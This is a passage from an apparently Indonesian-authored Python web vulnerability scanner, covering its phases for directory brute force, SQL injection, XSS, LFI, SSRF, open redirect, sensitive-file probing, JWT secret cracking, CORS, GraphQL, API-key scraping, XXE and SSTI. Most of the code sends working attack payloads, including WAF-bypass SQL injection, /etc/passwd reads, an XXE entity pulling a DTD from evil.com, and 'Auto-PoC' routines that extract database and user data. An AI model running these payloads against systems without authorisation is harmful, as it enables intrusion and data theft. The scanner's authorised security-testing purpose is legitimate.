                        400, 401, 403, 405, 500, 501, 502, 503):
                return (path, code, size, headers.get("Server", ""),
                        headers.get("Location", ""))
        except Exception:
            pass
        return None

    def scan(self, threads=20):
        info(f"Brute forcing {len(self.wordlist)} paths")
        info("Getting baseline 404...")
        self.baseline = self._get_baseline()
        if self.baseline:
            info(f"Baseline: HTTP {self.baseline['code']} / "
                 f"{self.baseline['length']} bytes")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(self._check, p): p
                       for p in self.wordlist}
            for f in as_completed(futures):
                r = f.result()
                if r:
                    path, code, size, srv, location = r
                    self.found.append(r)
                    color = BRIGHT_GREEN if code in (200, 201) \
                            else BRIGHT_YELLOW
                    print(f"{color}[{code}]{RESET} {path} "
                          f"({size} bytes)")
                    if location:
                        print(f"      -> {location}")
                    if code in (200, 201):
                        sev = "MEDIUM"
                        if any(x in path.lower() for x in
                               ["admin", "backup", "config", ".git",
                                ".env", "sql", "password", "secret",
                                "token", "key", "credential",
                                "database", "dump", "passwd",
                                "shadow", "id_rsa", "private"]):
                            sev = "HIGH"
                        add_finding(sev, "Exposed Path",
                                    self.base + path,
                                    f"HTTP {code} ({size} bytes)",
                                    "",
                                    "Batasi akses atau hapus")
        return self.found

    def recursive_scan(self, max_depth=2):
        if not self.recursive:
            return
        info(f"Starting recursive scan (max depth: {max_depth})")
        dirs_found = [(p, c) for p, c, _, _, _ in self.found
                      if c in (200, 301) and not extension(p)]
        for d, _ in dirs_found[:20]:
            if STOP:
                break
            info(f"Recursing into: {d}")
            sub_scanner = DirBrutePhase(self.base + d,
                                         self.wordlist, recursive=False)
            sub_scanner.baseline = self.baseline
            sub_found = sub_scanner.scan()
            for item in sub_found:
                self.found.append(item)

    def run(self):
        title("PHASE 4 - DIRECTORY BRUTE FORCE")
        self.scan()
        if self.recursive:
            self.recursive_scan()
        return {"found_paths": self.found}

#phase5
class SQLiPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []
        self.waf_detected = False
        self.db_type = None

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def detect_waf(self):
        test_payloads = ["<script>alert(1)</script>", "' OR 1=1--",
                         "../../etc/passwd", "${7*7}", ";ls -la"]
        waf_sigs = [
            "cloudflare", "cloudfront", "akamai", "incapsula",
            "sucuri", "modsecurity", "f5", "barracuda",
            "imperva", "fortinet", "aws waf", "azure waf",
            "blocked", "forbidden", "access denied",
            "request rejected", "security policy"
        ]
        for payload in test_payloads:
            if not self.params:
                break
            first_param = list(self.params.keys())[0]
            test_url = self._build_url(first_param, payload)
            code, headers, body, _ = http_get(test_url)
            text = (str(headers) + body.decode(errors="ignore")).lower()
            for sig in waf_sigs:
                if sig in text:
                    self.waf_detected = True
                    warning(f"WAF detected: {sig}")
                    add_finding("INFO", "WAF Detected", self.url,
                                f"Signature: {sig}", "",
                                "WAF aktif - payload butuh bypass")
                    return True
        return False

    def test_error_based(self, param):
        payloads = SQLI_ERROR_PAYLOADS[:]
        if self.waf_detected:
            payloads = SQLI_WAF_BYPASS + payloads
        for payload in payloads:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url)
            text = body.decode(errors="ignore")
            for sig in SQLI_ERROR_SIGNATURES:
                if sig.lower() in text.lower():
                    self._detect_db_type(sig)
                    add_finding("CRITICAL", "SQL Injection (Error-Based)",
                                test_url,
                                f"Param: {param}, payload: {payload}",
                                sig,
                                "Gunakan prepared statement")
                    self.findings.append(("error", param, payload,
                                          test_url, sig))
                    if AUTO_POC_ENABLED:
                        self._auto_poc_error(param)
                    return True
        return False

    def _detect_db_type(self, sig):
        sig_lower = sig.lower()
        if "mysql" in sig_lower or "mariadb" in sig_lower:
            self.db_type = "MySQL"
        elif "postgres" in sig_lower or "pg_" in sig_lower:
            self.db_type = "PostgreSQL"
        elif "ora-" in sig_lower or "oracle" in sig_lower:
            self.db_type = "Oracle"
        elif "sql server" in sig_lower or "odbc" in sig_lower \
                or "mssql" in sig_lower:
            self.db_type = "MSSQL"
        elif "sqlite" in sig_lower:
            self.db_type = "SQLite"
        elif "access" in sig_lower or "jet" in sig_lower:
            self.db_type = "MS Access"
        if self.db_type:
            info(f"DB Type: {self.db_type}")

    def test_boolean_based(self, param):
        for true_p, false_p in SQLI_BOOLEAN_PAYLOADS:
            url_true = self._build_url(param, true_p)
            url_false = self._build_url(param, false_p)
            _, _, body_t, _ = http_get(url_true)
            _, _, body_f, _ = http_get(url_false)
            if body_t and body_f:
                diff = abs(len(body_t) - len(body_f))
                if diff > 100:
                    add_finding("HIGH", "SQL Injection (Boolean-Based)",
                                url_true,
                                f"Param: {param}, diff: {diff} bytes",
                                f"True: {len(body_t)}, "
                                f"False: {len(body_f)}",
                                "Gunakan prepared statement")
                    self.findings.append(("boolean", param, true_p,
                                          url_true, f"diff={diff}"))
                    return True
        return False

    def test_time_based(self, param):
        for payload, expected_delay in SQLI_TIME_PAYLOADS:
            test_url = self._build_url(param, payload)
            start = time.time()
            http_get(test_url, timeout=15)
            elapsed = time.time() - start
            if elapsed >= (expected_delay - 0.5):
                add_finding("CRITICAL", "SQL Injection (Time-Based)",
                            test_url,
                            f"Param: {param}, delay: {elapsed:.2f}s",
                            f"Payload: {payload}",
                            "Gunakan prepared statement")
                self.findings.append(("time", param, payload,
                                      test_url, f"delay={elapsed:.2f}s"))
                return True
        return False

    def test_union_based(self, param):
        for payload, cols in SQLI_UNION_PAYLOADS:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url)
            text = body.decode(errors="ignore")
            has_error = False
            for sig in SQLI_ERROR_SIGNATURES:
                if sig.lower() in text.lower():
                    has_error = True
                    break
            if not has_error and code == 200 and body:
                add_finding("CRITICAL", "SQL Injection (Union-Based)",
                            test_url,
                            f"Param: {param}, columns: {cols}",
                            payload,
                            "Gunakan prepared statement")
                self.findings.append(("union", param, payload,
                                      test_url, f"cols={cols}"))
                return True
        return False

    def _auto_poc_error(self, param):
        if not AUTO_POC_SAFE_MODE:
            return
        info("Auto-PoC: extracting DB fingerprint (safe mode)")
        poc_payloads = {
            "MySQL": [
                ("1' AND 1=1 UNION SELECT @@version,user(),database()--",
                 "@@version"),
                ("1' UNION SELECT version(),user(),database()--",
                 "version()")
            ],
            "PostgreSQL": [
                ("1' UNION SELECT version(),current_user,current_database()--",
                 "PostgreSQL")
            ],
            "MSSQL": [
                ("1' UNION SELECT @@version,SUSER_NAME(),DB_NAME()--",
                 "@@version")
            ],
            "Oracle": [
                ("1' UNION SELECT banner,user,NULL FROM v$version--",
                 "Oracle")
            ]
        }
        if self.db_type in poc_payloads:
            for payload, sig in poc_payloads[self.db_type]:
                test_url = self._build_url(param, payload)
                code, _, body, _ = http_get(test_url)
                text = body.decode(errors="ignore")
                if code == 200 and sig.lower() in text.lower():
                    match = re.search(r'([\w\-\.\s]{5,80})', text)
                    if match:
                        evidence = match.group(1).strip()[:200]
                        add_finding("INFO", "Auto-PoC: DB Fingerprint",
                                    test_url,
                                    f"Extracted: {evidence}",
                                    evidence,
                                    "Informasi ini membantu validasi")
                        break

    def test_cookie_sqli(self):
        info("Testing SQLi via Cookie header")
        for cookie in SESSION_COOKIES:
            if not cookie.value:
                continue
            for payload in ["'", "\"", "1' OR '1'='1"]:
                test_val = cookie.value + payload
                headers = {"Cookie": f"{cookie.name}={test_val}"}
                code, _, body, _ = http_get(self.url, headers=headers)
                text = body.decode(errors="ignore")
                for sig in SQLI_ERROR_SIGNATURES:
                    if sig.lower() in text.lower():
                        add_finding("HIGH", "SQL Injection (Cookie)",
                                    self.url,
                                    f"Cookie: {cookie.name}",
                                    sig,
                                    "Sanitize cookie value")
                        return True
        return False

    def test_header_sqli(self):
        info("Testing SQLi via HTTP headers")
        headers_to_test = [
            "User-Agent", "Referer", "X-Forwarded-For",
            "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
            "X-Remote-Addr", "X-Client-IP", "X-Host",
            "X-Forwarded-Host", "X-Forwarded-Server"
        ]
        for h in headers_to_test:
            for payload in ["'", "\"", "1' OR '1'='1"]:
                headers = {h: payload}
                code, _, body, _ = http_get(self.url, headers=headers)
                text = body.decode(errors="ignore")
                for sig in SQLI_ERROR_SIGNATURES:
                    if sig.lower() in text.lower():
                        add_finding("HIGH", "SQL Injection (Header)",
                                    self.url,
                                    f"Header: {h}",
                                    sig,
                                    "Sanitize header value")
                        return True
        return False

    def run(self):
        title("PHASE 5 - SQL INJECTION (FULL)")
        if not self.params:
            warning("Tidak ada parameter di URL, testing headers only")
            self.test_header_sqli()
            return {"findings": self.findings}
        self.detect_waf()
        info(f"Testing {len(self.params)} params (4 techniques)")
        for param in self.params:
            if STOP:
                break
            print(f"\n  Testing param: {param}")
            if self.test_error_based(param):
                continue
            if self.test_union_based(param):
                continue
            if self.test_boolean_based(param):
                continue
            if self.test_time_based(param):
                continue
        self.test_cookie_sqli()
        self.test_header_sqli()
        return {"findings": self.findings,
                "waf": self.waf_detected,
                "db_type": self.db_type}
#phase6
class XSSPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def test_reflected(self, param):
        for payload in XSS_PAYLOADS:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url)
            text = body.decode(errors="ignore")
            if payload in text:
                add_finding("HIGH", "XSS (Reflected)", test_url,
                            f"Param: {param}", payload,
                            "Encode output, gunakan CSP, validasi input")
                self.findings.append(("reflected", param, payload, test_url))
                return True
            decoded = html_lib.unescape(payload)
            if decoded != payload and decoded in text:
                add_finding("HIGH", "XSS (Reflected/Decoded)", test_url,
                            f"Param: {param}", payload,
                            "Encode output, gunakan CSP")
                self.findings.append(("reflected-decoded", param,
                                      payload, test_url))
                return True
        return False

    def test_dom(self):
        code, _, body, _ = http_get(self.url)
        text = body.decode(errors="ignore")
        found_sinks = []
        for sink in XSS_DOM_SINKS:
            if sink in text:
                found_sinks.append(sink)
        if found_sinks:
            add_finding("MEDIUM", "XSS (DOM Sink Found)", self.url,
                        f"Sinks: {', '.join(found_sinks[:5])}",
                        "",
                        "Hindari sink berbahaya, gunakan textContent")
            self.findings.append(("dom", "n/a",
                                  ",".join(found_sinks), self.url))

    def test_stored(self, form):
        info("Testing stored XSS via form submission")
        action = form["action"]
        data = {}
        for inp in form["inputs"]:
            name = inp["name"]
            if not name:
                continue
            if inp["type"] in ("submit", "button", "reset", "image"):
                continue
            data[name] = XSS_PAYLOADS[0]
        if not data:
            return False
        if form["method"] == "POST":
            http_post(action, data)
        else:
            query = urlencode(data)
            http_get(action + "?" + query)
        code, _, body, _ = http_get(action)
        text = body.decode(errors="ignore")
        if XSS_PAYLOADS[0] in text:
            add_finding("HIGH", "XSS (Stored)", action,
                        "Payload tersimpan di server", XSS_PAYLOADS[0],
                        "Sanitize input, encode output")
            self.findings.append(("stored", "n/a", XSS_PAYLOADS[0], action))
            return True
        return False

    def run(self):
        title("PHASE 6 - XSS SCANNER (FULL)")
        self.test_dom()
        if not self.params:
            warning("Tidak ada parameter, skip reflected")
        else:
            info(f"Testing {len(self.params)} params")
            for param in self.params:
                if STOP:
                    break
                print(f"\n  Testing: {param}")
                self.test_reflected(param)
        code, _, body, _ = http_get(self.url)
        parser = LinkParser(self.url)
        try:
            parser.feed(body.decode(errors="ignore"))
        except Exception:
            pass
        for form in parser.forms[:5]:
            if STOP:
                break
            self.test_stored(form)
        return {"findings": self.findings}

#phase7
class LFIPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def test(self, param):
        for payload in LFI_PAYLOADS:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url)
            text = body.decode(errors="ignore")
            for sig in LFI_SIGNATURES:
                if sig in text:
                    add_finding("CRITICAL", "Local File Inclusion",
                                test_url,
                                f"Param: {param}, payload: {payload}",
                                sig,
                                "Validasi input, whitelist path, disable PHP wrappers")
                    self.findings.append((param, payload, test_url, sig))
                    if AUTO_POC_ENABLED and AUTO_POC_SAFE_MODE:
                        self._auto_poc_lfi(param)
                    return True
        return False

    def _auto_poc_lfi(self, param):
        info("Auto-PoC: extracting /etc/passwd first line (safe)")
        test_url = self._build_url(param, "../../../../etc/passwd")
        code, _, body, _ = http_get(test_url)
        text = body.decode(errors="ignore")
        for line in text.split("\n")[:5]:
            if "root:" in line or "daemon:" in line:
                add_finding("INFO", "Auto-PoC: LFI Proof",
                            test_url,
                            f"First line: {line[:80]}",
                            line[:200],
                            "Validasi temuan manual")
                break

    def test_php_wrapper(self, param):
        info(f"Testing PHP wrappers on {param}")
        for payload in LFI_PAYLOADS:
            if "php://" not in payload:
                continue
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url)
            text = body.decode(errors="ignore")
            if re.match(r'^[A-Za-z0-9+/=]{50,}$', text.strip()[:200]):
                add_finding("CRITICAL", "LFI (PHP Filter Base64)",
                            test_url,
                            f"Param: {param}, base64 output detected",
                            text[:200],
                            "Disable PHP wrappers di php.ini")
                self.findings.append((param, payload, test_url, "base64"))
                return True
        return False

    def run(self):
        title("PHASE 7 - LFI SCANNER (FULL)")
        if not self.params:
            warning("Tidak ada parameter, skip")
            return {"findings": []}
        info(f"Testing {len(self.params)} params (LFI + PHP wrappers)")
        for param in self.params:
            if STOP:
                break
            print(f"\n  Testing: {param}")
            if not self.test(param):
                self.test_php_wrapper(param)
        return {"findings": self.findings}

#phase8
class SSRFPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def test(self, param):
        for payload in SSRF_PAYLOADS:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url, timeout=8)
            text = body.decode(errors="ignore")
            for sig in SSRF_SIGNATURES:
                if sig in text:
                    add_finding("HIGH", "SSRF", test_url,
                                f"Param: {param}, payload: {payload}",
                                sig,
                                "Whitelist domain, block internal IP")
                    self.findings.append((param, payload, test_url, sig))
                    return True
        return False

    def run(self):
        title("PHASE 8 - SSRF SCANNER (FULL)")
        if not self.params:
            warning("Tidak ada parameter, skip")
            return {"findings": []}
        info(f"Testing {len(self.params)} params")
        for param in self.params:
            if STOP:
                break
            print(f"\n  Testing: {param}")
            self.test(param)
        return {"findings": self.findings}

#phase9
class OpenRedirectPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def test(self, param):
        for payload in OPEN_REDIRECT_PAYLOADS:
            test_url = self._build_url(param, payload)
            code, headers, _, _ = http_get(test_url)
            location = headers.get("Location", "")
            if code in (301, 302, 303, 307, 308):
                if "evil.com" in location or "google.com" in location \
                        or "attacker.com" in location:
                    add_finding("MEDIUM", "Open Redirect", test_url,
                                f"Param: {param}, Location: {location}",
                                location,
                                "Whitelist redirect target, validasi URL")
                    self.findings.append((param, payload, test_url, location))
                    return True
        return False

    def run(self):
        title("PHASE 9 - OPEN REDIRECT SCANNER")
        if not self.params:
            warning("Tidak ada parameter, skip")
            return {"findings": []}
        info(f"Testing {len(self.params)} params")
        for param in self.params:
            if STOP:
                break
            if param.lower() not in [p.lower()
                                      for p in OPEN_REDIRECT_PARAMS]:
                continue
            print(f"\n  Testing: {param}")
            self.test(param)
        return {"findings": self.findings}

#phase10
class SensitiveFilesPhase:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.findings = []

    def _check(self, path):
        url = self.base + path
        try:
            code, headers, body, _ = http_get(url, timeout=8)
            if code == 200:
                return (path, code, len(body),
                        body.decode(errors="ignore")[:300])
        except Exception:
            pass
        return None

    def scan(self, threads=20):
        info(f"Checking {len(SENSITIVE_FILES)} sensitive files")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(self._check, p): p
                       for p in SENSITIVE_FILES}
            for f in as_completed(futures):
                r = f.result()
                if r:
                    path, code, size, preview = r
                    self.findings.append(r)
                    critical_sev = any(x in path for x in
                                       [".env", ".git", "backup",
                                        ".sql", "id_rsa", ".aws",
                                        ".ssh", "credentials",
                                        "wp-config", "config.php"])
                    sev = "CRITICAL" if critical_sev else "HIGH"
                    add_finding(sev, "Sensitive File Exposed",
                                self.base + path,
                                f"{size} bytes",
                                preview,
                                "Hapus file atau batasi akses")
        return self.findings

    def run(self):
        title("PHASE 10 - SENSITIVE FILES SCANNER")
        self.scan()
        return {"findings": self.findings}

#phase11
class JWTPhase:
    def __init__(self, token):
        self.token = token
        self.findings = []
        self.header = {}
        self.payload = {}

    def _b64_decode(self, data):
        padding = "=" * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data + padding)

    def analyze(self):
        parts = self.token.split(".")
        if len(parts) != 3:
            error("Format JWT invalid")
            return
        try:
            self.header = json.loads(self._b64_decode(parts[0]))
            self.payload = json.loads(self._b64_decode(parts[1]))
        except Exception as e:
            error(f"Decode fail: {e}")
            return
        title("JWT HEADER")
        print(json.dumps(self.header, indent=2))
        title("JWT PAYLOAD")
        print(json.dumps(self.payload, indent=2))

        alg = self.header.get("alg", "").lower()
        if alg == "none":
            add_finding("CRITICAL", "JWT alg=none", "JWT",
                        "Algorithm 'none' - bypass possible",
                        json.dumps(self.header),
                        "Reject alg=none di server")
        elif alg in ("hs256", "hs384", "hs512"):
            for secret in JWT_WEAK_SECRETS:
                sig = hmac.new(secret.encode(),
                               f"{parts[0]}.{parts[1]}".encode(),
                               hashlib.sha256).digest()
                expected = base64.urlsafe_b64encode(sig) \
                    .rstrip(b"=").decode()
                if expected == parts[2]:
                    add_finding("CRITICAL", "JWT Weak Secret", "JWT",
                                f"Secret found: '{secret}'",
                                secret,
                                "Ganti dengan secret kuat random 256-bit")
                    break
        if "kid" in self.header:
            kid = self.header["kid"]
            if "../" in kid or "/" in kid or "\\" in kid:
                add_finding("HIGH", "JWT kid Path Traversal", "JWT",
                            f"kid contains path: {kid}", kid,
                            "Validasi kid")
        if "jku" in self.header:
            add_finding("MEDIUM", "JWT jku Present", "JWT",
                        f"jku: {self.header['jku']}",
                        self.header["jku"],
                        "Whitelist jku URL")
        exp = self.payload.get("exp")
        if exp:
            if exp < time.time():
                warning(f"Token expired: "
                        f"{datetime.fromtimestamp(exp)}")
            else:
                info(f"Expires: {datetime.fromtimestamp(exp)}")
        if "iat" in self.payload:
            iat = self.payload["iat"]
            info(f"Issued at: {datetime.fromtimestamp(iat)}")

    def run(self):
        title("PHASE 11 - JWT ANALYZER")
        self.analyze()
        return {"header": self.header, "payload": self.payload,
                "findings": self.findings}

#phase12
class TakeoverPhase:
    def __init__(self, subdomains):
        self.subdomains = subdomains
        self.findings = []

    def check(self, sub):
        for scheme in ("http", "https"):
            try:
                url = f"{scheme}://{sub}"
                code, _, body, _ = http_get(url, timeout=8)
                if code == 0:
                    continue
                text = body.decode(errors="ignore")
                for service, sigs in TAKEOVER_SIGNATURES.items():
                    for sig in sigs:
                        if sig.lower() in text.lower():
                            add_finding("HIGH",
                                        "Subdomain Takeover",
                                        url,
                                        f"Service: {service}",
                                        sig,
                                        "Klaim subdomain atau hapus DNS record")
                            self.findings.append((sub, service, sig))
                            return True
            except Exception:
                pass
        return False

    def run(self):
        title("PHASE 12 - SUBDOMAIN TAKEOVER")
        info(f"Checking {len(self.subdomains)} subdomains")
        with ThreadPoolExecutor(max_workers=15) as ex:
            list(ex.map(self.check, self.subdomains))
        return {"findings": self.findings}

#phade13
class CSRFPhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def analyze(self):
        code, _, body, _ = http_get(self.url)
        if code == 0:
            error("Target unreachable")
            return
        text = body.decode(errors="ignore")
        parser = LinkParser(self.url)
        try:
            parser.feed(text)
        except Exception:
            pass
        info(f"Found {len(parser.forms)} forms")
        for form in parser.forms:
            has_token = False
            token_name = None
            token_value = None
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if any(k in name for k in
                       ["csrf", "token", "_token", "authenticity",
                        "nonce", "_csrf", "csrf_token",
                        "csrfmiddlewaretoken"]):
                    has_token = True
                    token_name = inp["name"]
                    token_value = inp["value"]
                    break
            if form["method"] == "POST":
                if not has_token:
                    add_finding("MEDIUM", "CSRF Missing Token",
                                form["action"],
                                "POST form tanpa token", "",
                                "Tambahkan CSRF token")
                    self.findings.append((form, False))
                else:
                    if token_value and len(token_value) < 16:
                        add_finding("LOW", "CSRF Weak Token",
                                    form["action"],
                                    f"Token '{token_name}' pendek "
                                    f"({len(token_value)})",
                                    token_value,
                                    "Gunakan token random 32+ bytes")
                    self.findings.append((form, True))

    def run(self):
        title("PHASE 13 - CSRF ANALYZER")
        self.analyze()
        return {"findings": self.findings}

#phase14
class MethodPhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def check(self):
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH",
                   "OPTIONS", "TRACE", "CONNECT", "HEAD"]
        info("Testing HTTP methods")
        allowed = []
        for method in methods:
            code, headers, _, _ = http_request(self.url, method=method)
            if code in (200, 201, 204, 301, 302, 401, 403, 405):
                color = BRIGHT_GREEN if code < 400 else BRIGHT_YELLOW
                print(f"  {color}[{method}]{RESET} -> {code}")
                allowed.append((method, code))
                if method in DANGEROUS_METHODS and code < 400:
                    add_finding("MEDIUM",
                                "Dangerous Method Enabled",
                                self.url,
                                f"{method} allowed ({code})", "",
                                f"Disable {method}")
        if "OPTIONS" in [m for m, _ in allowed]:
            code, headers, _, _ = http_request(self.url,
                                                method="OPTIONS")
            allow_header = headers.get("Allow", "")
            if allow_header:
                info(f"Allow header: {allow_header}")
        self.findings = allowed
        return allowed

    def run(self):
        title("PHASE 14 - HTTP METHOD CHECKER")
        self.check()
        return {"methods": self.findings}

#phase15
class CookiePhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def analyze(self):
        code, headers, _, _ = http_get(self.url)
        if code == 0:
            return
        raw_cookies = []
        if hasattr(headers, "get_all"):
            raw_cookies = headers.get_all("Set-Cookie") or []
        if not raw_cookies and "Set-Cookie" in headers:
            raw_cookies = [headers["Set-Cookie"]]
        if not raw_cookies:
            info("No cookies set")
            return
        for cookie in raw_cookies:
            parts = cookie.split(";")
            name = parts[0].split("=")[0].strip()
            flags = cookie.lower()
            info(f"Cookie: {name}")
            if "httponly" not in flags:
                add_finding("LOW", "Cookie No HttpOnly", self.url,
                            f"Cookie '{name}' tanpa HttpOnly",
                            cookie[:200],
                            "Tambahkan flag HttpOnly")
            if "secure" not in flags:
                add_finding("LOW", "Cookie No Secure", self.url,
                            f"Cookie '{name}' tanpa Secure",
                            cookie[:200],
                            "Tambahkan flag Secure")
            if "samesite" not in flags:
                add_finding("LOW", "Cookie No SameSite", self.url,
                            f"Cookie '{name}' tanpa SameSite",
                            cookie[:200],
                            "Tambahkan SameSite=Strict/Lax")

    def run(self):
        title("PHASE 15 - COOKIE ANALYZER")
        self.analyze()
        return {"findings": self.findings}

#phase16
class CORSPhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test(self):
        for origin in CORS_ORIGINS:
            headers = {
                "Origin": origin,
                "Access-Control-Request-Method": "GET"
            }
            code, resp_headers, _, _ = http_request(
                self.url, method="OPTIONS", headers=headers)
            acao = resp_headers.get("Access-Control-Allow-Origin", "")
            acac = resp_headers.get("Access-Control-Allow-Credentials", "")
            if acao:
                print(f"  Origin: {origin} -> ACAO: {acao} "
                      f"(ACAC: {acac})")
                if acao == "*":
                    add_finding("MEDIUM", "CORS Wildcard", self.url,
                                f"ACAO: * (Origin: {origin})",
                                acao,
                                "Batasi origin ke whitelist")
                elif acao == origin:
                    if acac.lower() == "true":
                        add_finding("HIGH", "CORS Misconfiguration",
                                    self.url,
                                    f"Reflects Origin: {origin} + "
                                    f"Credentials",
                                    f"ACAO: {acao}, ACAC: {acac}",
                                    "Jangan reflect arbitrary origin")
                    else:
                        add_finding("MEDIUM", "CORS Reflects Origin",
                                    self.url,
                                    f"Reflects: {origin}",
                                    acao,
                                    "Whitelist origin valid")
                if "null" in acao.lower():
                    add_finding("MEDIUM", "CORS Null Origin",
                                self.url,
                                f"ACAO: null (Origin: {origin})",
                                acao,
                                "Reject null origin")

    def run(self):
        title("PHASE 16 - CORS MISCONFIGURATION")
        self.test()
        return {"findings": self.findings}

#phase17
class GraphQLPhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test(self):
        endpoints = ["/graphql", "/graphiql", "/api/graphql",
                     "/v1/graphql", "/query", "/gql"]
        base = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}"
        for ep in endpoints:
            test_url = base + ep
            for method in ["GET", "POST"]:
                if method == "GET":
                    code, _, body, _ = http_get(
                        test_url + "?query={__typename}", timeout=8)
                else:
                    code, headers, body = http_post(
                        test_url,
                        {"query": "{__typename}"},
                        headers={"Content-Type": "application/json"})
                if code == 200 and b"__typename" in body:
                    success(f"GraphQL: {test_url} ({method})")
                    add_finding("MEDIUM", "GraphQL Endpoint",
                                test_url,
                                f"Accessible via {method}",
                                body.decode(errors="ignore")[:200],
                                "Batasi akses, disable introspection")
                    payload = json.dumps({"query": GRAPHQL_INTROSPECTION})
                    code2, _, body2 = http_post(
                        test_url, payload,
                        headers={"Content-Type": "application/json"})
                    if code2 == 200 and b"__schema" in body2:
                        add_finding("HIGH",
                                    "GraphQL Introspection Enabled",
                                    test_url,
                                    "Introspection berhasil",
                                    body2.decode(errors="ignore")[:500],
                                    "Disable introspection di production")
                        self.findings.append(("introspection", test_url,
                                              body2.decode(errors="ignore")[:5000]))
                    self.findings.append(("endpoint", test_url))
                    return

    def run(self):
        title("PHASE 17 - GRAPHQL INTROSPECTION")
        self.test()
        return {"findings": self.findings}

#phase18
class APIKeyPhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def scan_page(self, page_url):
        try:
            code, headers, body, _ = http_get(page_url)
            if code != 200:
                return
            text = body.decode(errors="ignore")
            for pattern, name in API_KEY_PATTERNS:
                for match in re.finditer(pattern, text):
                    val = match.group(0)[:120]
                    if len(val) > 10:
                        add_finding("HIGH", "API Key Leak",
                                    page_url,
                                    f"{name}: {val[:60]}...",
                                    val,
                                    "Hapus dari source code")
                        self.findings.append((name, page_url, val))
        except Exception:
            pass

    def scan_js(self, base):
        code, _, body, _ = http_get(base)
        parser = LinkParser(base)
        try:
            parser.feed(body.decode(errors="ignore"))
        except Exception:
            pass
        scripts = list(parser.scripts)[:20]
        info(f"Scanning {len(scripts)} JS files")
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(self.scan_page, s) for s in scripts]
            for f in as_completed(futures):
                f.result()

    def run(self):
        title("PHASE 18 - API KEY LEAK SCANNER")
        info(f"Scanning main page: {self.url}")
        self.scan_page(self.url)
        self.scan_js(self.url)
        return {"findings": self.findings}

#phase19
class XXEPhase:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test(self):
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root/>'
        ]
        headers = {"Content-Type": "application/xml"}
        info("Testing XXE injection")
        for payload in xxe_payloads:
            code, _, body = http_post(self.url, payload, headers=headers)
            text = body.decode(errors="ignore")
            for sig in ["root:x:0:0", "[extensions]", "daemon:"]:
                if sig in text:
                    add_finding("CRITICAL", "XXE Injection", self.url,
                                "XML External Entity", sig,
                                "Disable external entity di XML parser")
                    self.findings.append((payload, sig))
                    return True

    def run(self):
        title("PHASE 19 - XXE DETECTOR")
        self.test()
        return {"findings": self.findings}

#phase20
class SSTIPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def test(self, param):
        ssti_tests = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("${{7*7}}", "49"),
            ("#{7*7}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("{{config}}", "Config"),
            ("{{self.__class__}}", "__class__"),
            ("${7*7}", "49"),
            ("@(7*7)", "49"),
            ("*{7*7}", "49"),
        ]
